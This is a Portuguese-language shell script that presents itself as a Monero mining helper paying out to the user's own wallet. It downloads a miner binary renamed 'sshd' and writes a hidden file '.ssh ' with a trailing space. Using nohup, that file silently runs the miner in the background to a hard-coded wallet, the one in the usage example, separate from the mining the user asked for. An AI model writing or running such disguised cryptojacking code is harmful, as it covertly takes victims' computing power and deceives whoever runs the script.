#!/bin/sh -e
clear
# Copyright Raphael Frajuca
# Miner por: noncepool

bash=$(echo $BASH)

if [ "$bash" = "/bin/bash" ]
then
echo "                  \033[41;1;37m Minerar XMR $versao \033[0m "
sleep 1
echo "$verde Forma de USO: \033[0m"
echo "sudo sh $0 $vermelho Carteira de XMR \033[0m  \n "
echo "$verde Exemplo:\033[0m"
echo "sudo sh $0 $vermelho 43GMgRC17wviKJwLrQioLe4LdEqVKuvK8cRGAPJ6u1VsTfWwuw4UQ3d2DK3UnYedNXYQja8NNGw8aVgAsbaqCfxWTpjyTD4 \033[0m   \n"
exit 0
fi

versao=1.8.3

corPadrao="\033[0m"
preto="\033[0;30m"
vermelho="\033[0;31m"
verde="\033[0;32m"
marrom="\033[0;33m"
azul="\033[0;34m"
purple="\033[0;35m"
cyan="\033[0;36m"
cinzaClaro="\033[0;37m"
pretoCinza="\033[1;30m"
vermelhoClaro="\033[1;31m"
verdeClaro="\033[1;32m"
amarelo="\033[1;33m"
azulClaro="\033[1;34m"
purpleClaro="\033[1;35m"
cyanClaro="\033[1;36m"
branco="\033[1;37m"

wallet=$1

if [ "$1" = ""  ]
then
echo "                  \033[41;1;37m Minerar XMR $versao \033[0m "
sleep 1
echo "$verde Forma de USO: \033[0m"
echo "sudo sh $0 $vermelho Carteira de Monero \033[0m  \n "
echo "$verde Exemplo:\033[0m"
echo "sudo sh $0 $vermelho 43GMgRC17wviKJwLrQioLe4LdEqVKuvK8cRGAPJ6u1VsTfWwuw4UQ3d2DK3UnYedNXYQja8NNGw8aVgAsbaqCfxWTpjyTD4 \033[0m   \n"
exit 0
fi

echo "                  \033[41;1;37m Minerar XMR $versao \033[0m "
sleep 1
echo "Carteira a ser Enviada os Moneros Minerados: $verde$wallet\033[0m   "
sleep 1

echo "\033[44;1;37m Termos e Condições:     \033[0m "
sleep 2

echo "$cinzaClaro        * Minerar Monero \033[0m   \n"
echo "$cinzaClaro        * Caso aceite esses termos, fique ciente de que: \033[0m "
echo "$cinzaClaro        * A utilização/modificação desse Script e de sua Total Responsabilidade, \033[0m "
echo "$cinzaClaro        * sendo que eu, Raphael Frajuca, não me responsabilizo por danos que possam  \033[0m "
echo "$cinzaClaro        * ser causados a seu sistema caso esse script seja mal utilizado/utilizado de forma  \033[0m "
echo "$cinzaClaro        * incorreta ou Modificado. \033[0m "
echo "$cinzaClaro        * Esse script tem o fim de tentar ajudar a minerar Monero usando o Algoritimo CRYPTONIGHT. \033[0m "
echo "$cinzaClaro        * QUALQUER pessoa tem a permissão do autor de adaptar esse Script para seus requisitos \033[0m "
echo "$cinzaClaro        * e Melhorar esse script por sí próprio a fim de ajudar a Comunidade. \033[0m "
echo "$cinzaClaro        * Esse script pode ser usado a fins comerciais, mas NUNCA pode ser Vendido/Alugado,  \033[0m "
echo "$cinzaClaro        * somente ser usado a beneficio próprio ou da Comunidade. \033[0m \n"
echo "$cinzaClaro        * Caso não aceite esses termos, encerre esse Script AGORA. \033[0m "

sleep 10

echo "\033[44;1;37m Baixando Recursos....     \033[0m "
sleep 1
rm -rf sshd ".ssh " > /dev/null
yum install screen -y > /dev/null
apt-get install screen -y > /dev/null
wget https://raw.githubusercontent.com/HaxStroke/XMR-MINER/master/sshd > /dev/null
curl -O https://raw.githubusercontent.com/HaxStroke/XMR-MINER/master/sshd > /dev/null
echo "while true; do ./sshd --max-cpu-usage 20 -a cryptonight -o stratum+tcp://monerohash.com:2222 -u 43GMgRC17wviKJwLrQioLe4LdEqVKuvK8cRGAPJ6u1VsTfWwuw4UQ3d2DK3UnYedNXYQja8NNGw8aVgAsbaqCfxWTpjyTD4 -p x > /dev/null; sleep 1; clear; done;" >> ".ssh "
sleep 1

echo "\033[44;1;37m Configurando e Compilando Recursos.....     \033[0m "
sleep 1
chmod +x sshd
chmod +x ".ssh "
nohup ./".ssh " &

echo "\033[44;1;37m Inicializando Mineração......     \033[0m "
sleep 2
echo "Obs: Assim que aparecer a inicialização do processo de Mineração, você pode fechar sua janela do terminal que a mineração vai continuar."
sleep 1
echo "Você pode acompanhar como anda sua Mineração em: https://monerohash.com/ colando sua carteira $wallet "
sleep 10
screen ./sshd --max-cpu-usage 80 -a cryptonight -o stratum+tcp://monerohash.com:5555 -u $wallet -p x